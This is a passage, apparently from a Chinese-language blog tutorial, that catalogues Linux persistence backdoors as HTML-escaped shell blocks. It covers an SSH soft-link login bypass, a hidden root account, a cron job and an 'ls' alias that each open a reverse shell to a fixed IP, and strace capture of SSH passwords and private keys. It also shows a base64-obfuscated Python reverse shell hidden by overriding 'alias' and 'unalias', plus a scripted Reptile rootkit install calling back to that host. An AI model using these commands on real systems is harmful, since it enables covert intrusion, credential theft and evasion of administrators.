&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看是否使用PAM进行身份验证：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/ssh/sshd_config|grep UsePAM&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@xx.xx.xx.xx -p 8888 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;任意密码登录即可&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;公私钥后门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#公私钥后门&#34;&gt;#&lt;/a&gt; 公私钥后门&lt;/h4&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3JlYWQvY3YxNzcyMTM0NS8=&#34;&gt;https://www.bilibili.com/read/cv17721345/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;生成密钥对&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh-keygen -t rsa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;修改ssh配置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vim /etc/ssh/sshd_config&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RSAAuthentication yes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PubkeyAuthentication yes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;AuthorizedKeysFile .ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;添加root帐号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#添加root帐号&#34;&gt;#&lt;/a&gt; 添加 root 帐号&lt;/h4&gt;
&lt;p&gt;添加账号 test1，设置 uid 为 0 ，密码为 123456&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;useradd -p `openssl passwd - 1 - salt &amp;#x27;salt&amp;#x27; 123456` test1 -o -u 0 -g root -G&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root -s /bin/bash -d /home/test1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;或者直接打印到passwd中：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;xiaodi:x:0:0::/:/bin/sh&amp;quot; &amp;gt;&amp;gt; /etc/passwd #增加超级用户账号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;passwd xiaodi #修改xiaodi的密码为xiaodi123&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;定时任务后门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#定时任务后门&#34;&gt;#&lt;/a&gt; 定时任务后门&lt;/h4&gt;
&lt;p&gt;利用系统的定时任务功能进行反弹 Shell&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;编辑后门反弹&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vim /etc/.xiaodi.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/47.94.236.117/3333 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x /etc/.xiaodi.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;添加定时任务（分时天月周）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vim /etc/crontab&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*/1 * * * * root /etc/.xiaodi.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;strace-监控后门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#strace-监控后门&#34;&gt;#&lt;/a&gt; Strace 监控后门&lt;/h4&gt;
&lt;p&gt;strace 是一个动态跟踪工具，它可以跟踪系统调用的执行。我们可以把他当成一个键盘记录的后门，来扩大我们的信息收集范围。当其他机器登录时，会将 ssh 的登录情况保存，可以实现实时监控 ssh 密码，可以将其自动发到外网上。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;记录sshd明文&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(strace -f -F -p `ps aux|grep &amp;quot;sshd -D&amp;quot;|grep -v grep|awk &amp;#123;&amp;#x27;print $2&amp;#x27;&amp;#125;` -t -e trace=read,write -s 32 2&amp;gt; /tmp/.sshd.log &amp;amp;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;grep -E &amp;#x27;read\(6, &amp;quot;.+\\ 0 \\ 0 \\ 0 \\.+&amp;quot;&amp;#x27; /tmp/.sshd.log&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;记录sshd私钥&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(strace -f -F -p `ps aux|grep &amp;quot;sshd -D&amp;quot;|grep -v grep|awk &amp;#123;&amp;#x27;print $2&amp;#x27;&amp;#125;` -t -e trace=read,write -s 4096 2&amp;gt; /tmp/.sshd.log &amp;amp;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;grep &amp;#x27;PRIVATE KEY&amp;#x27; /tmp/.sshd.log&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;alias后门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#alias后门&#34;&gt;#&lt;/a&gt; Alias 后门&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;输入&lt;span class=&#34;built_in&#34;&gt;ls&lt;/span&gt;即可反弹shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alias ls=&amp;#x27;alerts()&amp;#123; ls $* --color=auto;bash -i &amp;gt;&amp;amp; /dev/tcp/47.94.236.117/3333 0&amp;gt;&amp;amp;1; &amp;#125;;alerts&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;这样做效果达到了，但是&lt;span class=&#34;built_in&#34;&gt;ls&lt;/span&gt;原功能无法执行成功&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;去掉别名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unalias ls&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;不影响&lt;span class=&#34;built_in&#34;&gt;ls&lt;/span&gt;使用情况下的别名后门：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alias ls=&amp;#x27;alerts()&amp;#123; ls $* --color=auto;python3 -c &amp;quot;import base64,sys;exec(bas&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;e64.b64decode(&amp;#123;2:str,3:lambda b:bytes(b,&amp;#x27;\&amp;#x27;&amp;#x27;UTF-8&amp;#x27;\&amp;#x27;&amp;#x27;)&amp;#125;[sys.version_info[0]](&amp;#x27;\&amp;#x27;&amp;#x27;aW1w b3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgc mV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgP SBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVF JFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiNDcuOTQuMjM2LjExNyIsIDY2NjYp KQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMCkKICAgICAgICBvcy5kd XAyKHMuZmlsZW5vKCksIDEpCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygp LCAyKQogICAgICAgIHAgPSBzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwg Ii1pIl0pCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgZXhpdCgp&amp;#x27; \&amp;#x27;&amp;#x27;)))&amp;quot;;&amp;#125;;alerts&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alias unalias=&amp;#x27;alerts()&amp;#123; if [ $# != 0 ]; then if [ $* != &amp;quot;ls&amp;quot; ]&amp;amp;&amp;amp;[ $* != &amp;quot;al ias&amp;quot; ]&amp;amp;&amp;amp;[ $* != &amp;quot;unalias&amp;quot; ]; then unalias $*;else echo &amp;quot;-bash: unalias: $&amp;#123;*&amp;#125;: n ot found&amp;quot;;fi;else echo &amp;quot;unalias: usage: unalias [-a] name [name ...]&amp;quot;;fi;&amp;#125;;alerts&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alias alias=&amp;#x27;alerts()&amp;#123; alias &amp;quot;$@&amp;quot; | grep -v unalias | sed &amp;quot;s/alerts.*lambda.*/ls --color=auto&amp;#x27;\&amp;#x27;&amp;#x27;/&amp;quot;;&amp;#125;;alerts&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;持久化+隐藏：重启依旧生效&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vim /etc/upload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vim ～/.bashrc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if [ -f /etc/upload ]; then&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;. /etc/upload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fi&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;rootkit后门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rootkit后门&#34;&gt;#&lt;/a&gt; Rootkit 后门&lt;/h4&gt;
&lt;p&gt;现在常用的 linux 维持权限的方法大多用 crontab 和开机自启动，同时使用 的大多是 msf 或者其它的 tcp 连接来反弹 shell , 这种做法比较容易被管理员发 现。所以我们想有一个非 tcp 连接、流量不容易被怀疑的后门，并且在大量的 s hell 的场景下，可以管 shell，Reptile 刚好是种 LKM rootkit，因此具有很好的隐 藏性和强大的功能。如需检测此后门是否存在，需要使用类似于 gscan、checkr ootkit 的工具检测，但不一定能捕获到流量特征。&lt;/p&gt;
&lt;p&gt;项目地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2YwcmIxZGQzbi9SZXB0aWxlL3JlbGVhc2VzLw==&#34;&gt;https://github.com/f0rb1dd3n/Reptile/releases/&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自动化脚本&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;centos自动化脚本&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;kernel=`&lt;span class=&#34;built_in&#34;&gt;uname&lt;/span&gt; -r`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;yum -y install perl vim gcc make g++ unzip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;由于Cenots内核管理不便，所以使用下载对应版本的kernel-devel到本地&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;yum -y localinstall kernel-devel-&amp;quot;$kernal&amp;quot;.rpm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd Reptile-2.0/ &amp;amp;&amp;amp; chmod +x ./setup.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./setup.sh install &amp;lt;&amp;lt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reptile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hax0r&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s3cr3t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reptile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;666&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;y&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47.94.236.117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;ubuntu自动化脚本&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;apt-get install vim gcc make g++ unzip -y&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;apt-get -y install linux-headers-$(uname -r)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd Reptile-2.0/ &amp;amp;&amp;amp; chmod +x ./setup.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./setup.sh install &amp;lt;&amp;lt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reptile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hax0r&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s3cr3t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reptile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;666&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;y&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47.94.236.117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用参考：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2YwcmIxZGQzbi9SZXB0aWxlL3dpa2k=&#34;&gt;https://github.com/f0rb1dd3n/Reptile/wiki&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;隐藏进程文件连接属性&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span 